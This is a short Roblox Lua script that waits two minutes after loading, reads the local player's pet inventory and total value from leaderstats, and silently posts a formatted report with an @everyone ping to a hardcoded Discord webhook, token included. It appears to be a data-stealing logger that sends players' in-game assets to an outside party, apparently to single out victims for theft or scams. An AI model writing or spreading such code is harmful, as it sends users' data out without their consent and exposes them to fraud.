local Http = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")


local WEBHOOK = "https://discord.com/api/webhooks/1400543185209528441/NhkUJfUuqiPiyl6gO7PbawGZl4Pmmu2DC_uX1UMQaOsUkXGvbRMBxA4LIoTRg9vGiFzm"


if not game:IsLoaded() then
    game.Loaded:Wait()
end


local player = Players.LocalPlayer
while not player do
    task.wait(1)
    player = Players.LocalPlayer
end


local function collectPets()
    -- Ожидание leaderstats
    local attempts = 0
    while not player:FindFirstChild("leaderstats") and attempts < 10 do
        task.wait(2)
        attempts = attempts + 1
    end
    
    if not player:FindFirstChild("leaderstats") then
        return
    end
    
    local leaderstats = player.leaderstats
    
   
    local pets = leaderstats:FindFirstChild("Pets") or leaderstats:FindFirstChild("Animals")
    if not pets then
        return
    end


    local totalValue = 0
    if leaderstats:FindFirstChild("TotalValue") then
        totalValue = leaderstats.TotalValue.Value
    end
    
    local report = "**@everyone**\n**Total Value:** " .. totalValue .. "\n\n"
    
    for _, item in ipairs(pets:GetChildren()) do
        if item:IsA("Folder") then
            local age = item:FindFirstChild("Age") and item.Age.Value or 0
            local weight = item:FindFirstChild("Weight") and item.Weight.Value or 0
            local value = item:FindFirstChild("Value") and item.Value.Value or 0
            
            report ..= string.format(
                "%s [Age: %d] [%.2f KG] - %d Value\n",
                item.Name,
                age,
                weight,
                value
            )
        end
    end
    
    -- Отправка в Discord
    pcall(function()
        Http:PostAsync(WEBHOOK, Http:JSONEncode({
            content = report,
            username = "Garden Alert"
        }))
    end)
end


task.wait(120)
collectPets()
